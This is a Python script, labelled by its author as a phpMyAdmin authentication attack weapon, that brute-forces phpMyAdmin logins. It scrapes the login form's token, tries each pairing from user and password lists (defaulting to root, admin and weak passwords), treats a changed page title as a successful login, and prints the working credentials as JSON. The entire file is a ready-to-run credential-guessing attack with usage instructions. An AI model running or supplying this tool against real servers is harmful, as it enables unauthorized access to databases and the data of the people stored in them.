# -*- coding: utf-8 -*-
# @Time    : 2021/12/4
# @Author  : SecCodeCat
# @Description  : PHPMyAdmin身份认证攻击武器
# @Usage: python PHPMyAdmin身份认证攻击武器.py -t http://localhost:8080/index.php --user admin,root --pw 123456,root

import json
import traceback
from optparse import OptionParser
from re import findall

from requests import session
from html import unescape

# PMA地址,例如 http://localhost/index.php
# target = 'http://localhost:8080'
# target = 'http://localhost:8080/index.php'

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

ss = session()
ss.headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'}

user_dict = ["root", "admin"]
password_dict = ["12345678", "root", "admin"]


def get_token(text) -> str:
    '''获取token'''
    token = findall("name=\"token\" value=\"(.*?)\" />", text)
    return unescape(token[0]) if token else None


def get_title(text) -> str:
    '''获取标题'''
    title = findall('<title>(.*)</title>', text)
    return title[0] if title else None


def try_login(user, pwd, token, target):
    '''尝试登陆'''
    data = {'pma_username': user,
            'pma_password': pwd,
            'server': 1,
            'target': 'index.php',
            'token': token}

    r = ss.post(url=target, data=data)
    return r.text


def main():
    usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target",
                     help="PHPMyAdmin URL, e.g. http://localhost:8080/index.php")
    parse.add_option("-u", '--user', type="string", dest="username", help="login user name, e.g. root, guest ")
    parse.add_option("-p", '--pw', type="string", dest="password", help="login password , e.g. abc123, toor")
    options, args = parse.parse_args()

    users = list()
    passwords = list()

    if options.username:
        users = options.username.split(',')

    if options.password:
        passwords = options.password.split(',')

    if not options.target:
        ret['status'] = "fail"
        return json.dumps(ret)

    if not options.username:
        users = user_dict

    if not options.password:
        passwords = password_dict

    html = try_login('', '', '', options.target)
    title_fail = get_title(html)
    token = get_token(html)
    for user in users:
        for pwd in passwords:
            # print(f'[I]尝试登陆: {user}  {pwd}')
            html = try_login(user, pwd, token, options.target)
            title = get_title(html)
            token = get_token(html)
            if title != title_fail:
                ret['status'] = 'success'
                ret['info'].append({'username': user, 'password': pwd})
            else:
                # fail
                pass

    if not ret['status']:
        ret['status'] = 'fail'

    return json.dumps(ret)


if __name__ == "__main__":
    try:
        ret = main()
        print(ret)
    except Exception as e:
        print(e)
